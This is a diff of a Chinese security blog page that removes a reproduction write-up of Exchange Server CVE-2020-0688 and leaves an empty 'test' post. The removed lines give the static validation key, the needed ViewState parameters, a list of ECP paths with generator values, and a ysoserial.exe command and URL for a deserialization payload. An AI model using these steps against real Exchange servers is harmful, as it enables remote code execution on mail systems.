@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>ExchangeServer CVE-2020-0688复现 | Knsec         |       博观而约取 - 厚积而薄发</title>
-  <meta name="keywords" content=" 漏洞复现 , 内网 , Exchange ">
-  <meta name="description" content="ExchangeServer CVE-2020-0688复现 | Knsec         |       博观而约取 - 厚积而薄发">
+  <title>test | Knsec         |       博观而约取 - 厚积而薄发</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="test | Knsec         |       博观而约取 - 厚积而薄发">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="test">
@@ -524,43 +524,24 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-ExchangeServer-CVE-2020-0688复现" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-test" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">ExchangeServer CVE-2020-0688复现</h1>
+        <h1 class="article-title">test</h1>
     
     <div class="article-meta">
         
         
         
-        <span class="book">
-            <i class="iconfont icon-category"></i>
-            
-            
-            <a  data-rel="漏洞复现">漏洞复现</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color5">漏洞复现</a>
-            
-            <a class="color3">内网</a>
-            
-            <a class="color4">Exchange</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-07-09 12:31:55'>2020-07-09 12:11</time>
+            发布时间 : <time class="date" title='最后更新: 2020-10-07 22:10:54'>2020-10-07 22:10</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:990</span>
+        <span>字数:0</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -579,7 +560,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#测试环节"><span class="toc-text">测试环节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用条件"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他可利用路径"><span class="toc-text">其他可利用路径</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -595,113 +576,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>CVE-2020-0688是Exchange一个由于默认加密密钥造成的反序列化漏洞，该漏洞存在于ecp中，因为没涉及到Exchange的工作逻辑，所以本质上是一个web漏洞。</p>
-<blockquote>
-<p>影响范围：</p>
-<p>Microsoft Exchange Server 2010 Service Pack 3</p>
-<p>Microsoft Exchange Server 2013</p>
-<p>Microsoft Exchange Server 2016</p>
-<p>Microsoft Exchange Server 2019</p>
-</blockquote>
-<p><strong>注意：Exchange Server 2010默认使用.net v2.0，而ysoserial.net-V2版没有ViewState插件，漏洞利用有一定难度。</strong></p>
-<blockquote>
-<p>测试环境：exchange 2013 SP1 +win2012r2</p>
-<p>使用的环境是Klion的</p>
-</blockquote>
-<h2 id="测试环节"><a href="#测试环节" class="headerlink" title="测试环节"></a>测试环节</h2><p>​    每次软件安装都会产生随机密钥不同，所有exchange在安装后的web.config文件中都拥有相同的validationKey和decryptionKey的值，用来保证ViewState的安全性。</p>
-<p>​    ViewState是ASP.NET Web应用以序列化格式存储在客户机上的服务端数据。客户端通过__VIEWSTATE请求参数将这些数据返回给服务器。</p>
-<p>路径为：</p>
-<blockquote>
-<p>C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\web.config</p>
-<p>可以提取validationkey、validationalg的值</p>
-</blockquote>
-<img src="/../images/image-20200709121432169.png"/>
-
-<p>正是因为使用了静态的密钥，通过登录邮箱账户之后，我们可以欺骗服务器反序列化恶意创建的ViewState数据。</p>
-<p>​    使用YSoSerial.net，可以在Exchange Control Panel web应用上执行任意.net代码。为了利用这个漏洞，我们需要从经过身份验证的session中收集ViewStateUserKey和VIEWSTATEGENERATOR两个值。ViewStateUserKey可以从ASP.NET的cookie中获取，而VIEWSTATEGENERATOR可以在一个隐藏字段中找到，这些都可以通过浏览器中的工具找到。</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>​    在这里回顾一下复现此漏洞需要的四个点（validationkey、validationalg默认为全版本不变）</p>
-<pre><code class="bash">validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF
-validationalg = SHA1
-__VIEWSTATEGENERATOR
-ASP.NET_SessionId</code></pre>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>此时我们需要知道的是，普通的域用户访问Exchange的路径为：/ecp/default.aspx</p>
-<blockquote>
-<p>在default.aspx页面中的cookie中提取ASP.NET_SessionId的值，dac5a612-8edd-4bb4-848f-029243970f4f</p>
-</blockquote>
-<img src="/../images/image-20200709121747225.png"/>
-
-<blockquote>
-<p>结合之前收集到的值validationkey、validationalg、__VIEWSTATEGENERATOR、ASP.NET_SessionId</p>
-<p>使用ysoserial.net工具生成反序列化payload：</p>
-</blockquote>
-<p><img src="/../images/image-20200709121812864.png" alt="image-20200709121812864"></p>
-<blockquote>
-<p>构造URL，并用上图生成的payload替换<strong><em>ViewState</em></strong>，通过get请求</p>
-</blockquote>
-<pre><code>https://ip:port/ecp/default.aspx?__VIEWSTATEGENERATOR=&lt;B97B4E27&gt;&amp;__VIEWSTATE=&lt;ViewState&gt;</code></pre><p><img src="/../images/image-20200709121853284.png" alt="image-20200709121853284"></p>
-<h2 id="其他可利用路径"><a href="#其他可利用路径" class="headerlink" title="其他可利用路径"></a>其他可利用路径</h2><pre><code class="bash">/ecp/default.aspx
-__VIEWSTATEGENERATOR=B97B4E27
-
-/ecp/PersonalSettings/HomePage.aspx?showhelp=false&amp;
-__VIEWSTATEGENERATOR=1D01FD4E
-
-/ecp/PersonalSettings/HomePage.aspx?showhelp=false&amp;
-__VIEWSTATEGENERATOR=1D01FD4E
-
-/ecp/Organize/AutomaticReplies.slab?showhelp=false&amp;
-__VIEWSTATEGENERATOR=FD338EE0
-
-/ecp/RulesEditor/InboxRules.slab?showhelp=false&amp;
-__VIEWSTATEGENERATOR=FD338EE0
-
-/ecp/Organize/DeliveryReports.slab?showhelp=false&amp;
-__VIEWSTATEGENERATOR=FD338EE0
-
-/ecp/MyGroups/PersonalGroups.aspx?showhelp=false&amp;
-__VIEWSTATEGENERATOR=A767F62B
-
-/ecp/MyGroups/ViewDistributionGroup.aspx?pwmcid=1&amp;id=38f4bec5-704f-4272-a654-95d53150e2ae&amp;ReturnObjectType=1
-__VIEWSTATEGENERATOR=321473B8
-
-/ecp/Customize/Messaging.aspx?showhelp=false&amp;
-__VIEWSTATEGENERATOR=9C5731F0
-
-/ecp/Customize/General.aspx?showhelp=false&amp;
-__VIEWSTATEGENERATOR=72B13321
-
-/ecp/Customize/Calendar.aspx?showhelp=false&amp;
-__VIEWSTATEGENERATOR=4AD51055
-
-/ecp/Customize/SentItems.aspx?showhelp=false&amp;
- __VIEWSTATEGENERATOR=4466B13F
-
-/ecp/PersonalSettings/Password.aspx?showhelp=false&amp;
-__VIEWSTATEGENERATOR=59543DCA
-
-/ecp/SMS/TextMessaging.slab?showhelp=false&amp;
-__VIEWSTATEGENERATOR=FD338EE0
-
-/ecp/TroubleShooting/MobileDevices.slab?showhelp=false&amp;
-__VIEWSTATEGENERATOR=FD338EE0
-
-/ecp/Customize/Regional.aspx?showhelp=false&amp;
-__VIEWSTATEGENERATOR=9097CD08
-
-/ecp/MyGroups/SearchAllGroups.slab?pwmcid=3&amp;ReturnObjectType=1
-__VIEWSTATEGENERATOR=FD338EE0
-
-/ecp/Security/BlockOrAllow.aspx?showhelp=false&amp;
-__VIEWSTATEGENERATOR=362253EF</code></pre>
-<p><strong>其中，path为页面路径，apppath=应用程序名</strong></p>
-<p>例如</p>
-<pre><code class="bash">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;echo test &gt; C:/test.txt&quot; --path=&quot;/ecp/PersonalSettings/HomePage.aspx --apppath=&quot;/ecp/&quot; --validationalg=&quot;&lt;填&gt;&quot; --validationkey=&quot;&lt;填&gt;&quot; --viewstateuserkey=&quot;&lt;填&gt;&quot; --isdebug --islegacy</code></pre>
-<blockquote>
-<p>需要注意的是：</p>
-<p>1、当访问/ecp/default.aspx没有__VIEWSTATEGENERATOR时，系统需要安装KB2919355补丁后才会显示，但是即使不返回该参数，也可以使用：<strong>B97B4E27</strong></p>
-<p>2、ysoserial.exe生成的payload要用URL Encode编码</p>
-<p>3、新建的测试账号，需要测试账号正常登录了一次之后再跑POC</p>
-<p>4、不支持exchange 2010以及更低的版本，漏洞还是存在的。原因是exchange 2010默认使用的是.net2.0，但是ysoserial.net是4.0编译的，这是版本不兼容的问题，前段时间的SQLServer reporting远程代码执行（CVE-2020-0618）也是一样。但是在CVE-2020-0618漏洞中，可以使用ysoserial.net-v2的ActivitySurrogateSelector模块生成payload来解决版本不兼容的问题。CVE-2020-0688在ysoserial.net中只是借助了ViewState插件来生成payload的，但ysoserial.net-v2目前没有ViewState插件。我想，理论上只要调试修改xaml，向低版本兼容.net就可以了</p>
-</blockquote>
+        <p><img src="/../_posts/..%5Cimages/image-1998991.png" alt="image-1998991"></p>
 
       
        
